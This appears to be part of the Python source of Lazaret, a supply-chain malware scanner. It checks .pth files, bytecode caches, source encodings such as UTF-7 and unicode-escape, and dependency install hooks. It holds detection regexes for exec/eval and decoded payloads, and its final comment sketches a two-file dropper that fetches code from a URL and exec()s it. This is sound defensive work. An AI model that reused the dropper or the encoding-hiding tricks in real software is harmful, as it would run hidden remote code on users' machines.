    issue["fix"] = ("Review the file manually and report the error (re-run with LAZARET_DEBUG=1 "
                    "for a traceback).")
    return issue


def _pyc_issue(rid, name, sev, path, msg, why, fix):
    return {"rule": rid, "name": name, "type": "HOTSPOT", "sev": sev, "msg": msg,
            "why": why, "fix": fix, "ref": "CWE-506 · Supply chain",
            "file": path, "line": 1, "snippet": [], "snipStart": 1}


# ---------------- .pth files (SC-PTH-EXEC) ----------------
# site.py executes every line of a .pth file in site-packages that starts
# with 'import' at EVERY interpreter start. The registry has checked archive
# members with this since the beginning; project and --deps scans now run
# the same check on every .pth file they meet (review: a directory holding
# only evil.pth exited 2, "nothing to scan"). A .pth file is not a source
# file: no other rule runs on it, and it is not counted in the metrics.
PTH_EXT = ".pth"
_PTH_EXEC_RE = re.compile(
    r"\b(?:exec|eval|compile)\s*\(|\b(?:b64decode|b32decode|b85decode|a85decode|fromhex|unhexlify)\b"
    r"|\.decode\s*\(|\bmarshal\.loads\b|\bzlib\.decompress\b|\bcodecs\.decode\b|\\x[0-9a-fA-F]{2}")


_PTH_IMPORT = ("import ", "import\t")


def pth_issues(path, text):
    """SC-PTH-EXEC: site.py executes every line of a .pth file in
    site-packages that starts with 'import' at EVERY interpreter start — no
    import of the package needed. CRITICAL when the line also executes or
    decodes code, MAJOR otherwise (setuptools' distutils shim and namespace
    .pth files are this shape: listed for review). The registry's check
    (lazaret.registry.repo) and the project walk share this one helper's
    semantics; the npm engine's twin is js/src/lib/pth.js.

    Lines are taken both ways site.py splits them: at \\n, \\r and \\r\\n
    (iterating the file: 3.10, 3.11, early 3.12 releases), and with
    str.splitlines() (3.13+ and recent 3.12 releases), which also breaks at
    \\v, \\f, \\x1c-\\x1e, \\x85, U+2028 and U+2029 — review: `# path
    notes\\fimport sys; …` gave no finding while python3.13 ran its import.
    A finding is reported at the physical (\\n) line holding the statement,
    once per line."""
    out, lines = [], normalize_newlines(text).split("\n")
    for i, line in enumerate(lines):
        if not (line.startswith(_PTH_IMPORT)
                or any(part.startswith(_PTH_IMPORT) for part in line.splitlines())):
            continue
        hostile = bool(_PTH_EXEC_RE.search(line))
        out.append(mk_issue(
            {"id": "SC-PTH-EXEC", "name": "Code in a .pth file", "type": "HOTSPOT",
             "sev": "CRITICAL" if hostile else "MAJOR",
             "msg": (".pth line runs code at every Python start"
                     + (" and executes or decodes a payload." if hostile else ".")),
             "why": ("site.py executes .pth lines that start with 'import' whenever the "
                     "interpreter starts, whether or not the package is imported — a "
                     "persistence and execution vector that needs no install hook."),
             "fix": "Find out why the package ships executable .pth code; remove it if unexplained.",
             "ref": "CWE-506 · Supply chain"}, path, i + 1, lines))
    return out


def pyc_issues(path, header, has_source):
    """SC-PYC-UNCHECKED / SC-PYC-ORPHAN for one .pyc in a __pycache__ dir.
    `header` is at least the first 8 bytes; `has_source` whether the
    matching <module>.py sits next to the __pycache__ directory."""
    out = []
    if (len(header) >= 8 and header[2:4] == b"\r\n"
            and int.from_bytes(header[4:8], "little") == 0b01):
        out.append(_pyc_issue(
            "SC-PYC-UNCHECKED", "Unchecked-hash bytecode", "CRITICAL", path,
            f"{path} is an unchecked-hash .pyc (PEP 552): Python imports it without "
            "checking the source.",
            "An unchecked-hash .pyc is loaded on import even when the .py next to it says "
            "something else, so code that was never reviewed runs while the reviewed "
            "source looks benign.",
            "Delete the __pycache__ directory, keep bytecode out of version control and "
            "rebuild from reviewed source."))
    if not has_source:
        out.append(_pyc_issue(
            "SC-PYC-ORPHAN", "Bytecode without source", "MAJOR", path,
            f"{path} has no matching source file.",
            "Bytecode without its source cannot be reviewed, and a .pyc can be run "
            "directly (python file.pyc) or loaded by a custom importer.",
            "Delete the file, or restore the source it was compiled from and review it."))
    return out


def detect_encoding(head):
    """M17 / FIX-SPEC 4: BOM / UTF-16 sniff of a file's first bytes.

    Returns {'encoding': codec, 'reported': bool, 'bom': n}: BOM FF FE ->
    utf-16-le, FE FF -> utf-16-be, EF BB BF -> utf-8-sig; otherwise a NUL in
    the first 4 bytes betrays BOM-less UTF-16 (NUL at index 1 or 3 ->
    utf-16-le, else utf-16-be). reported=True for every non-plain-UTF-8 case
    (-> Q-ENCODING); bom is the number of BOM bytes to drop before decoding.
    The old sniff returned the generic 'utf-16' codec for BOM-less input,
    whose decoder raises UnicodeError ('UTF-16 stream does not start with
    BOM') — which escaped and killed the whole scan (review item 1)."""
    if head.startswith(b"\xff\xfe"):
        return {"encoding": "utf-16-le", "reported": True, "bom": 2}
    if head.startswith(b"\xfe\xff"):
        return {"encoding": "utf-16-be", "reported": True, "bom": 2}
    if head.startswith(b"\xef\xbb\xbf"):
        return {"encoding": "utf-8-sig", "reported": True, "bom": 0}
    first = head[:4]
    if b"\x00" in first:
        le = first[1:2] == b"\x00" or first[3:4] == b"\x00"
        return {"encoding": "utf-16-le" if le else "utf-16-be", "reported": True, "bom": 0}
    return {"encoding": "utf-8", "reported": False, "bom": 0}


def _python_cookie(data):
    """PEP 263 encoding declaration of Python source bytes: (name, line_no) or
    (None, None). Same rule as the interpreter's tokenizer: line 1, or line 2
    when line 1 is blank or a comment."""
    lines = re.split(rb"\r\n|\r|\n", data, maxsplit=2)[:2]
    for idx, line in enumerate(lines):
        m = _PY_COOKIE_RE.match(line)
        if m:
            return m.group(1).decode("ascii"), idx + 1
        if not _PY_BLANK_RE.match(line):
            break
    return None, None


#: Coding-cookie names only newer Pythons know (3.13: windows_31j; 3.14: 874,
#: ms874, windows_874, cseuckr, iso_8859_8_e, iso_8859_8_i), resolved on every
#: supported version so a file decodes the same whichever Python scans it
#: (normalized as encodings.normalize_encoding does, on the lower-cased name).
CODEC_ALIAS_EXTRAS = {"windows_31j": "cp932", "874": "cp874", "ms874": "cp874",
                      "windows_874": "cp874", "cseuckr": "euc_kr",
                      "iso_8859_8_e": "iso8859-8", "iso_8859_8_i": "iso8859-8",
                      # 3.14.x patch releases (3.14.7 has them, 3.14.0 does not)
                      "cp01140": "cp1140", "csibm01140": "cp1140", "ibm01140": "cp1140",
                      "ebcdic_us_37_euro": "cp1140", "cp00858": "cp858", "csibm00858": "cp858",
                      "ibm00858": "cp858", "pc_multilingual_850_euro": "cp858"}
#: Codecs that decode with the host's code page (Windows only): unknown here.
HOST_CODECS = frozenset(("mbcs", "oem"))
#: Single-byte tables that differ between supported Pythons, as the newest has
#: them (3.13 maps palmos 0x9B to U+203A; 3.10-3.12 to U+009B).
CHARMAP_FIXES = {"palmos": {0x9B: "\u203a"}}
#: Multi-byte codecs the npm engine decodes with the runtime's TextDecoder.
#: With these, the single-byte codecs (scripts/make_codec_tables.py writes
#: it Python's tables), UTF-7, Latin-1, ASCII and the escape codecs, both
#: engines decode what a cookie names; any other codec (UTF-32, ISO-2022-KR,
#: Shift_JIS-2004, …) is read as UTF-8 by both, with SC-TRUNCATED.
_TEXTDECODER_CODECS = frozenset((
    "utf-16", "utf-16-le", "utf-16-be", "shift_jis", "cp932", "euc_jp", "iso2022_jp",
    "gbk", "gb2312", "cp936", "gb18030", "big5", "cp950", "euc_kr", "cp949"))


def _codec_key(name):
    """A codec name as encodings.normalize_encoding sees it (lower case)."""
    return re.sub(r"[^a-z0-9.]+", "_", name.lower()).strip("_")


def _normal_codec(name):
    """Codec for a cookie name as the interpreter resolves it (utf-8-* and
    latin-1-* spellings fold to their base codec), or None if Python has no
    such text codec. The same on every supported Python and host
    (CODEC_ALIAS_EXTRAS, HOST_CODECS)."""
    short = name[:12].lower().replace("_", "-")
    if short == "utf-8" or short.startswith("utf-8-"):
        return "utf-8"
    if short in ("latin-1", "iso-8859-1", "iso-latin-1") or short.startswith(
            ("latin-1-", "iso-8859-1-", "iso-latin-1-")):
        return "iso8859-1"
    key = _codec_key(name)
    extra = CODEC_ALIAS_EXTRAS.get(key) or CODEC_ALIAS_EXTRAS.get(key.replace(".", "_"))
    if extra:
        return extra
    try:
        info = _codecs.lookup(name)
    except LookupError:
        return None
    if not getattr(info, "_is_text_encoding", True):
        return None                     # rot13, hex, zlib… are not text encodings
    return None if info.name in HOST_CODECS else info.name


def charmap_table(codec):
    """What each byte decodes to in the single-byte (charmap) codec `codec`: a
    256-character string, U+FFFE for a byte it leaves undefined, as the newest
    supported Python has it (CHARMAP_FIXES); None for any other codec."""
    try:
        info = _codecs.lookup(codec)
    except LookupError:
        return None
    mod = sys.modules.get(getattr(info.incrementaldecoder, "__module__", "") or "")
    table = getattr(mod, "decoding_table", None)
    if not isinstance(table, str) or len(table) != 256:
        return None
    fix = CHARMAP_FIXES.get(info.name)
    return table.translate(fix) if fix else table


def _decoded_by_both_engines(codec):
    return (codec in ("utf-7", "ascii", "iso8859-1", "charmap") or codec in _TEXTDECODER_CODECS
            or codec in ESCAPE_CODECS or charmap_table(codec) is not None)


#: Codecs that decode escape sequences before Python reads the code: in a file
#: that declares one, '\u000a' in a comment is a newline and '\u0065' is 'e'
#: (SC-ESCAPE-CODEC). Both engines decode them (_decode_escapes).
ESCAPE_CODECS = ("unicode-escape", "raw-unicode-escape")
#: A \N escape: an N after an odd run of backslashes (linear: a run is
#: tried only from the character before it).
_NAMED_ESCAPE_RE = re.compile(rb"(?:^|[^\\])(?:\\\\)*\\N")


def _decode_escapes(body, codec):
    """`body` as Python's unicode_escape or raw_unicode_escape decodes it, or
    None where the npm engine (encoding.js decodeEscapes) cannot decode it
    exactly as Python does: a \\N{name} escape (it has no Unicode name table)
    or an escape Python rejects, such as a short \\x or a backslash at the end
    (the interpreter would not run the file)."""
    if codec == "unicode-escape" and _NAMED_ESCAPE_RE.search(body):
        return None
    with warnings.catch_warnings():     # "invalid escape sequence" (kept as written)
        warnings.simplefilter("ignore")
        try:
            return body.decode(codec)
        except UnicodeDecodeError:
            return None


#: A surrogate code point: never text on its own (see decode_source).
_SURROGATE_RE = re.compile("[\ud800-\udfff]")


def decode_source(data, lang=None):
    """Decode the bytes of a source file the way its interpreter would read
    them. Returns (text, info):

      info = {"encoding": codec label, "reported": bool (-> Q-ENCODING),
              "utf7": bool (-> SC-UTF7), "cookieLine": n or None,
              "escapes": True for an escape codec (-> SC-ESCAPE-CODEC),
              "undecoded": True when the codec is not decoded (-> SC-TRUNCATED)}

    FIX-SPEC 4 (BOM / NUL sniff) first; for Python source without a BOM or
    NUL, FIX-SPEC 15: a PEP 263 cookie naming a codec other than UTF-8 decodes
    with that codec (Q-ENCODING); UTF-7 additionally sets utf7 (a UTF-7
    '+AAo-' is a newline, so code can hide inside a comment), and so do the
    escape codecs ('\\u000a'). An unknown codec
    decodes as UTF-8 with replacement, and so does a codec the npm engine
    cannot decode exactly as Python does (undecoded: the file is not fully
    scanned). Never raises on content. Line endings are normalized to \\n, as
    text mode reads them. A surrogate code point left by the codec (UTF-7
    '+2AA-', unicode_escape '\\udc80') becomes U+FFFD, as in the npm engine's
    decoders: text holding one cannot be written as UTF-8 (review: the HTML
    report raised UnicodeEncodeError after the JSON was written, exit 5) and
    the flow engine could not parse it."""
    enc = detect_encoding(data[:4])
    if (enc["reported"] and not enc["bom"] and enc["encoding"].startswith("utf-16")
            and not _text_is_plausible(data[:4096].decode(enc["encoding"], "replace"))):
        # A NUL near the top of a UTF-8 file (`/*\0*/eval(…)`) is not UTF-16:
        # decoded that way the payload turns into CJK-looking garbage that no
        # rule reads. Accept the BOM-less UTF-16 guess only when it reads as
        # text (real UTF-16 source is mostly ASCII).
        enc = {"encoding": "utf-8", "reported": False, "bom": 0}
    codec, body = enc["encoding"], data[enc["bom"]:]
    info = {"encoding": codec, "reported": enc["reported"], "utf7": False, "cookieLine": None}
    if lang == "py" and not enc["reported"]:
        name, line_no = _python_cookie(data)
        if name is not None:
            real = _normal_codec(name)
            if real is None:
                info.update(encoding=name, reported=True, cookieLine=line_no)
            elif real != "utf-8":
                info.update(encoding=real, reported=True, cookieLine=line_no,
                            utf7=(real == "utf-7"
                                  or name.lower().replace("_", "-") in _UTF7_NAMES))
                if real in ESCAPE_CODECS:
                    info["escapes"] = True
                if _decoded_by_both_engines(real):
                    codec = real
                else:           # read as UTF-8, as the npm engine can only read it
                    info["undecoded"] = True
    text = _decode_escapes(body, codec) if codec in ESCAPE_CODECS else None
    if codec in ESCAPE_CODECS and text is None:
        info["undecoded"] = True        # read as UTF-8, as the npm engine can only read it
        codec = "utf-8"
    if text is None:
        try:
            text = body.decode(codec)
        except Exception:               # malformed input or a misbehaving codec:
            try:                        # never abort the scan over content
                text = body.decode(codec, "replace")
            except Exception:
                text = body.decode("utf-8", "replace")
    fix = CHARMAP_FIXES.get(codec)
    if fix:
        text = text.translate(fix)
    if not text.isascii():
        text = _SURROGATE_RE.sub("\ufffd", text)
    return normalize_newlines(text), info


def encoding_issues(path, text, info):
    """Q-ENCODING (and SC-UTF7) findings for a decoded source file. Their
    snippets are redacted with the file's own entropy literals and PEM
    blocks, as scan_file's are (review: a UTF-8-BOM settings.py showed the
    SEED literal its S-ENTROPY finding redacted in the Q-ENCODING snippet)."""
    if not info["reported"]:
        return []
    lines = text.split("\n")
    red = _Redactor(lines)
    out = [mk_issue(
        {"id": "Q-ENCODING", "name": "Non-UTF-8 source encoding", "type": "SMELL",
         "sev": "INFO",
         "msg": f"Source file is not UTF-8 (detected {info['encoding']}); decoded explicitly.",
         "why": "A non-UTF-8 source read as UTF-8 decodes to mojibake, hiding every "
                "pattern-based finding — a UTF-16 eval() scans clean.",
         "fix": "Re-save the file as UTF-8 so tooling reads it as written.",
         "ref": "Maintainability"}, path, 1, lines, redactor=red)]
    if info["utf7"]:
        out.append(mk_issue(
            {"id": "SC-UTF7", "name": "UTF-7 source encoding", "type": "HOTSPOT",
             "sev": "CRITICAL",
             "msg": "Python source declares UTF-7; code can hide in comments.",
             "why": "In UTF-7, '+AAo-' decodes to a newline: text that every editor, diff "
                    "and reviewer shows as a comment becomes executable code when Python "
                    "reads the file. No legitimate project needs a UTF-7 source file.",
             "fix": "Re-save the file as UTF-8 and review the decoded text (the findings "
                    "for this file are reported against it).",
             "ref": "CWE-506 · Supply chain"}, path, info["cookieLine"] or 1, lines,
            redactor=red))
    if info.get("escapes"):
        out.append(mk_issue(
            {"id": "SC-ESCAPE-CODEC", "name": "Escape-sequence source encoding", "type": "HOTSPOT",
             "sev": "CRITICAL",
             "msg": f"Python source declares {info['encoding']}; code can hide in escape sequences.",
             "why": "Python decodes this file's escape sequences before it reads the code: "
                    "'\\u000a' is a newline and '\\u0065' is 'e', so text that every editor, "
                    "diff and reviewer shows as a comment or a string escape becomes executable "
                    "code. No legitimate project needs this source encoding.",
             "fix": "Re-save the file as UTF-8 and review the decoded text (the findings "
                    "for this file are reported against it).",
             "ref": "CWE-506 · Supply chain"}, path, info["cookieLine"] or 1, lines,
            redactor=red))
    if info.get("undecoded"):
        out.append(truncated_issue(
            path, f"its source encoding ({info['encoding']}) is not decoded by Lazaret; "
                  f"the file was read as UTF-8"))
    return out


def _dep_tree_kind(name, path):
    """True when directory `name` at `path` is a dependency tree: always for
    node_modules / bower_components / site-packages; for vendor / venv /
    .venv / env only when a marker (DEP_TREE_MARKERS) sits directly inside."""
    if name in DEP_TREE_DIRS:
        return True
    markers = DEP_TREE_MARKERS.get(name)
    if markers is None:
        return False
    names, suffixes = markers
    try:
        with os.scandir(path) as it:
            for e in it:
                if e.name in names or (suffixes and e.name.endswith(suffixes)):
                    return True
    except OSError:
        pass
    return False


def _check_pycache(rel_dir, path, parent_names, out):
    """__pycache__ is not source-scanned; every .pyc directly inside is
    checked (PEP 552 flags, matching source). Symlinks -> Q-SYMLINK."""
    try:
        with os.scandir(path) as it:
            entries = sorted(it, key=lambda e: e.name)
    except OSError as exc:
        out.append(unreadable_issue(_fs_display(rel_dir), exc.strerror or type(exc).__name__))
        return
    for e in entries:
        rel = os.path.join(rel_dir, e.name)
        disp = _fs_display(rel)
        try:
            st = e.stat(follow_symlinks=False)
        except OSError as exc:
            out.append(unreadable_issue(disp, exc.strerror or type(exc).__name__))
            continue
        if _stat.S_ISLNK(st.st_mode) or _is_reparse_point(st):
            out.append(symlink_issue(disp, _readlink(e.path)))
            continue
        if not (_stat.S_ISREG(st.st_mode) and e.name.endswith(".pyc")):
            continue
        try:
            header = _read_prefix(e.path, 16)
        except OSError as exc:
            out.append(unreadable_issue(disp, exc.strerror or str(exc) or type(exc).__name__))
            continue
        module = e.name.split(".", 1)[0]
        has_source = (module + ".py") in parent_names or (module + ".pyw") in parent_names
        out.extend(pyc_issues(disp, header, has_source))


def _readlink(path):
    try:
        target = os.readlink(path)
    except (OSError, ValueError):
        return "?"
    return link_target_text(target) if os.name == "nt" else target


def link_target_text(target):
    """A Windows link target as the user wrote it. Windows stores an absolute
    target in the NT namespace (\\??\\C:\\x), and os.readlink returns it as
    \\\\?\\C:\\x (\\\\?\\UNC\\server\\share\\x for a share); the npm engine
    (libuv) gives C:\\x and \\\\server\\share\\x. Same undoing as libuv, so
    both engines name the target the same way (cross-platform rule 2)."""
    if not isinstance(target, str) or not target.startswith("\\\\?\\"):
        return target
    rest = target[4:]
    if len(rest) >= 2 and rest[0].isascii() and rest[0].isalpha() and rest[1] == ":" \
            and (len(rest) == 2 or rest[2] == "\\"):
        return rest                                       # \\?\C:\x -> C:\x
    if rest[:4].upper() == "UNC\\":
        return "\\\\" + rest[4:]                             # \\?\UNC\s\sh -> \\s\sh
    return target


def _collect_file(path, rel, st, in_dep, col):
    """Classify and read one regular file (see the section comment)."""
    name = os.path.basename(rel)
    disp = _fs_display(rel)
    ext = os.path.splitext(name)[1].lower()
    size = st.st_size
    manifest = name in MANIFEST_NAMES or ext in GYP_EXTS
    pth = not manifest and ext == PTH_EXT
    lang = None if manifest or pth else EXTS.get(ext)
    issues = col["issues"]
    if not manifest and not pth and lang is None:
        # FIX-SPEC 9: every non-source regular file is classified by magic
        # bytes from a header sample (repo mode used to look at a fixed list
        # of extensions only: an ELF named `helper` or `logo.png` passed) —
        # unless its #! line makes it a Node or Python script: then it is
        # source (script_source_lang).
        head = _read_prefix(path, HEADER_SAMPLE_BYTES)
        lang = script_source_lang(head)
        if lang is None:
            bi = classify_binary(disp, head, size, "repo")
            if bi:
                issues.append(bi)
            elif not in_dep and configsecrets.is_config_file(name) and (
                    head.startswith((b"\xff\xfe", b"\xfe\xff")) or not looks_binary(head)):
                _collect_config(path, disp, size, col)          # text (UTF-16 with its BOM too)
            return
    if lang is not None and ext in MPEG_TS_EXTS:
        head = _read_prefix(path, HEADER_SAMPLE_BYTES)
        if _mpeg_ts(head):                  # a video (a camera's .mts), not TypeScript
            bi = classify_binary(disp, head, size, "repo")
            if bi:
                issues.append(bi)
            return
    # FIX-SPEC 9: the size cap applies only to files that would be read whole.
    # Verdict integrity (audit C2/G16): an oversize file is an SC-TRUNCATED
    # finding, never a silent skip, and it is not added to the scanned files.
    if size > SOURCE_SIZE_CAP:
        issues.append(truncated_issue(
            disp, f"{size:,} bytes exceeds the {SOURCE_SIZE_CAP:,}-byte file limit"))
        return
    data = _read_prefix(path, SOURCE_SIZE_CAP + 1)
    if len(data) > SOURCE_SIZE_CAP:      # grew between the lstat and the read
        issues.append(truncated_issue(
            disp, f"read exceeded the {SOURCE_SIZE_CAP:,}-byte file limit"))
        return
    if manifest:
        col["manifests"].append({"path": disp, "dep": in_dep,
                                 "content": normalize_newlines(data.decode("utf-8", "replace"))})
        return
    if pth:                # only the .pth check runs on it (decoded as the registry does)
        col["pth"].append(disp)
        issues.extend(pth_issues(disp, data.decode("utf-8-sig", "replace")))
        return
    if data[:4] in APPLE_DOUBLE_MAGIC:
        bi = classify_binary(disp, data[:HEADER_SAMPLE_BYTES], size, "repo")
        if bi:
            issues.append(bi)
        return
    text, info = decode_source(data, lang)
    issues.extend(encoding_issues(disp, text, info))
    col["files"].append({"path": disp, "content": text, "lang": lang, "dep": in_dep})


def _collect_config(path, disp, size, col):
    """Read a config or data file for scan_config_file (see configsecrets):
    decoded like source but without the encoding notes, since it is not
    code; over CONFIG_SCAN_CAP a Q-SKIPPED-CONFIG note instead."""
    cap = configsecrets.CONFIG_SCAN_CAP
    if size > cap:
        col["issues"].append(config_skipped_issue(
            disp, f"{size:,} bytes is over the {cap:,}-byte limit for config files"))
        return
    data = _read_prefix(path, cap + 1)
    if len(data) > cap:                  # grew between the lstat and the read
        col["issues"].append(config_skipped_issue(
            disp, f"it grew past the {cap:,}-byte limit for config files while it was read"))
        return
    text = decode_source(data)[0]
    if not configsecrets.own_report(text):          # a report of Lazaret's own is not config
        col["configs"].append({"path": disp, "content": text})


def _collect(root, excludes=(), include_deps=False):
    """Walk `root` iteratively. Returns {"files", "manifests", "pth", "issues",
    "skipped", "configs"}: files = [{path, content, lang, dep}], manifests =
    [{path, content, dep}], pth = paths of the .pth files checked, issues =
    collection findings (binary classification, SC-TRUNCATED,
    Q-ENCODING/SC-UTF7, SC-PYC-*, SC-PTH-EXEC, Q-SYMLINK, Q-UNREADABLE,
    Q-SKIPPED-CONFIG), skipped = [(rel, n_files, n_bytes)] pruned trees,
    configs = [{path, content}] config and data files outside dependency
    trees (scan_config_file). Paths are root-relative (os.sep separators) and
    valid UTF-8. Raises ScanTargetError when the root itself cannot be
    listed."""
    excludes = set(excludes or ())
    col = {"files": [], "manifests": [], "pth": [], "issues": [], "skipped": [], "configs": []}
    issues = col["issues"]
    seen_dirs = set()
    stack = [("", False)]
    while stack:
        rel_dir, in_dep = stack.pop()
        full_dir = os.path.join(root, rel_dir) if rel_dir else root
        try:
            with os.scandir(full_dir) as it:
                entries = sorted(it, key=lambda e: e.name)
            st_dir = os.stat(full_dir) if not rel_dir else None
        except OSError as exc:
            if not rel_dir:
                raise ScanTargetError(
                    f"cannot read directory {_fs_display(str(root))}: "
                    f"{exc.strerror or type(exc).__name__}") from None
            issues.append(unreadable_issue(_fs_display(rel_dir), exc.strerror or type(exc).__name__))
            continue
        if st_dir is not None and st_dir.st_ino:
            seen_dirs.add((st_dir.st_dev, st_dir.st_ino))
        names = {e.name for e in entries}
        subdirs = []
        for e in entries:
            rel = os.path.join(rel_dir, e.name) if rel_dir else e.name
            try:
                st = e.stat(follow_symlinks=False)
            except OSError as exc:
                issues.append(unreadable_issue(_fs_display(rel), exc.strerror or type(exc).__name__))
                continue
            mode = st.st_mode
            if _stat.S_ISLNK(mode) or (_stat.S_ISDIR(mode) and _is_reparse_point(st)):
                issues.append(symlink_issue(_fs_display(rel), _readlink(e.path)))
            elif _stat.S_ISDIR(mode):
                subdirs.append((e, rel, st))
            elif not _stat.S_ISREG(mode):
                issues.append(unreadable_issue(_fs_display(rel), _special_kind(mode)))
            else:
                try:
                    _collect_file(e.path, rel, st, in_dep, col)
                except OSError as exc:
                    reason = (str(exc) if isinstance(exc, _NotRegularFile)
                              else exc.strerror or type(exc).__name__)
                    issues.append(unreadable_issue(_fs_display(rel), reason))
                except Exception as exc:        # one file must never kill the walk
                    issues.append(scan_error_issue(_fs_display(rel), exc))
        push = []
        for e, rel, st in subdirs:
            name = e.name
            if name in ALWAYS_PRUNE_DIRS or name in excludes:
                _count_skipped_tree(root, e.path, _fs_display(rel), col["skipped"])
                continue
            if name == PYCACHE_DIR:
                try:
                    _check_pycache(rel, e.path, names, issues)
                except Exception as exc:
                    issues.append(scan_error_issue(_fs_display(rel), exc))
                continue
            key = (st.st_dev, st.st_ino)
            if st.st_ino and key in seen_dirs:
                issues.append(unreadable_issue(_fs_display(rel),
                                               "directory already visited (filesystem loop)"))
                continue
            if st.st_ino:
                seen_dirs.add(key)
            dep = in_dep or _dep_tree_kind(name, e.path)
            if dep and not in_dep and not include_deps:
                _count_skipped_tree(root, e.path, _fs_display(rel), col["skipped"])
                continue
            push.append((rel, dep))
        stack.extend(reversed(push))       # pop order = sorted, depth-first (like os.walk)
    return col


def collect_files(root, extra_excludes, include_deps=False):
    """Legacy API: returns (files, manifests, binary_issues) — binary_issues
    being every collection finding (see _collect) — and records the pruned
    trees for skipped_tree_issues() (reset per call). With include_deps,
    dependency trees are walked too; their files are marked dep=True and
    scanned only with supply-chain/secret rules. New callers: scan_project()."""
    _reset_scan_state()
    col = _collect(root, extra_excludes, include_deps=include_deps)
    _SKIPPED_TREES.extend(col["skipped"])
    return col["files"], col["manifests"], col["issues"]


def _scan_manifest_entry(mf):
    """binding.gyp and every other .gyp / .gypi file -> scan_gyp (G11);
    package.json -> scan_manifest. A manifest inside a detected dependency
    tree gets the registry hook set."""
    if os.path.splitext(mf["path"])[1].lower() in GYP_EXTS:
        return scan_gyp(mf["path"], mf["content"])
    dep = mf.get("dep")
    if dep is None:
        dep = is_dependency_manifest(mf["path"])
    return scan_manifest(mf["path"], mf["content"], registry=dep)


# ---------------- --deps: what a dependency runs ----------------
# A --deps scan read a dependency's files with the supply-chain rules only,
# and the registry's two tests of what runs did not run on them: the
# install-script test (install_script_risk) on the scripts a dependency's
# install hook runs, and the weaker import-time test (import_time_risk) on
# its code. An installed package whose postinstall sent the environment to a
# server, or whose code did so when loaded, passed with an ordinary MAJOR
# "install hook" finding, or with nothing. Now:
#   * each install hook of a dependency's manifest — package.json scripts,
#     binding.gyp actions, and binding.gyp command expansions that run a file
#     of the package (scan_gyp's INFO findings) — is followed to the files
#     it runs (follow_hook, then Node's resolution: the file, with an
#     extension, the directory's package.json "main", its index file), only
#     to regular files inside the scan root, through no link and nothing an
#     exclusion pruned; the hook escalates to CRITICAL when one of them fails
#     install_script_risk, as in the registry. A file it runs that the walk
#     did not read as source (node runs lib/install.dat as JavaScript) is
#     read and scanned as a dependency's JavaScript; a shell script is only
#     tested; a hook the walk cannot follow to the end is SC-TRUNCATED.
#   * a dependency whose package root holds a binding.gyp and whose
#     package.json names no install or preinstall script gets the hook npm
#     runs for it, `node-gyp rebuild` (MAJOR, _implicit_gyp_hooks), as the
#     registry lists it.
#   * every JavaScript or Python file of a dependency that no hook runs gets
#     import_time_risk: SC-IMPORT-RISK (MAJOR). On a real node_modules of
#     14,286 JavaScript files (webpack, next, jest, eslint, typescript ...)
#     it found nothing. (The detection round) But not a web app's static
#     assets, which run in a browser, not in Node or Python: a JavaScript
#     file in a _next, static or public directory of its package
#     (_DEPS_WEB_DIRS) that none of its npm package's entry points reach —
#     main, module, bin and exports, then the local files they require and
#     import and the scripts they start (_deps_web_assets) — is left out of
#     the import-time test and the cross-file follower, as the registry
#     leaves it out of what runs.
#     litellm's proxy UI ships a Next.js export whose chunk of guardrail test
#     prompts (one shows `curl … | sh`) the test read as code, CRITICAL; a
#     package whose main points into static/ is still read.
# Twin of the npm engine's js/src/deps.js.
_DEPS_WEB_DIRS = frozenset({"_next", "static", "public"})
_DEPS_REACH_MAX = 5000          # files an npm package's entry points are followed to, at most
_DEPS_LOCAL_DEP_RE = re.compile(
    r"""(?:\brequire\s*\(\s*|\bimport\s*\(\s*|\bfrom\s+|^\s*import\s+|\bexport\s+[^'"\n;]*?\bfrom\s+)"""
    r"""(['"])(\.{1,2}/[^'"\n]+)\1""", re.M)
_DEP_IMPORT_RISK_WHY = (
    "An installed package's code runs with the application's privileges when it is loaded "
    "or its command runs. Collecting credentials or the whole environment next to a network "
    "call is the shape of an import-time stealer; SDKs read the few variables they need. A "
    "weaker indicator than the same code in an install script: the file may have a reason.")
_DRIVE_RE = re.compile(r"[A-Za-z]:")


def _tree_join(base, target):
    """A hook's `target` joined with the directory `base` ('/'-separated,
    relative to the scan root), normalized; None when it is absolute (a file
    of the machine, not of the tree) or leaves the scan root."""
    target = target.replace("\\", "/")
    if target.startswith("/") or _DRIVE_RE.match(target):
        return None
    joined = posixpath.normpath(posixpath.join(base or ".", target))
    if joined in (".", "..") or joined.startswith("../"):
        return None
    return joined


class _DependencyTree:
    """What a --deps scan knows of the tree, to follow a dependency's install
    hook: the files it read (by '/'-separated path) and, for the others, the
    disk under the scan root — regular files only, reached through no link
    and no directory an exclusion prunes."""

    def __init__(self, root, files, manifests, excludes):
        self.root = os.fspath(root)
        self.sources = {f["path"].replace(os.sep, "/"): f for f in files}
        self.manifests = {m["path"].replace(os.sep, "/"): m for m in manifests}
        self.excludes = set(excludes or ()) | ALWAYS_PRUNE_DIRS
        self.regular = {}                   # rel -> is a regular file (not read as source)
        self.read = {}                      # rel -> its text, read here (None: not text)

    def is_file(self, rel):
        if rel in self.sources or rel in self.manifests:
            return True
        if rel not in self.regular:
            self.regular[rel] = self._on_disk(rel)
        return self.regular[rel]

    def _on_disk(self, rel):
        parts = rel.split("/")
        if any(p in self.excludes or p in ("", ".", "..") for p in parts[:-1]):
            return False
        path = self.root
        try:
            for k, part in enumerate(parts):
                path = os.path.join(path, part)
                st = os.lstat(path)
                if _stat.S_ISLNK(st.st_mode) or _is_reparse_point(st):
                    return False
                if k < len(parts) - 1 and not _stat.S_ISDIR(st.st_mode):
                    return False
            return _stat.S_ISREG(st.st_mode)
        except (OSError, ValueError):       # ValueError: a NUL in the name
            return False

    def resolve(self, path):
        """The file Node runs for `path` (LOAD_AS_FILE, then LOAD_AS_DIRECTORY:
        its package.json "main", its index file), or None. Twin of the
        registry's _ArtifactScan._resolve."""
        candidates = node_candidates(path)
        found = next((c for c in candidates[:6] if self.is_file(c)), None)
        if found:
            return found
        manifest = self.manifests.get(posixpath.join(path.rstrip("/"), "package.json"))
        if manifest is not None:
            data, _problems = load_manifest(manifest["path"], manifest["content"])
            main = data.get("main") if isinstance(data, dict) else None
            if isinstance(main, str) and main.strip():
                target = _tree_join(path.rstrip("/"), main)
                if target is not None:
                    found = next((c for c in node_candidates(target) if self.is_file(c)), None)
                    if found:
                        return found
        return next((c for c in candidates[6:] if self.is_file(c)), None)


# ---------------- Cross-file received code (both engines since 0.1.8) ----------------
# A dropper can split the network source and the code-runner across files of
# one package, so neither file alone trips the single-file detector:
#     _net.py:      def pull(): return requests.get(URL).text
#     __init__.py:  from ._net import pull; exec(pull())
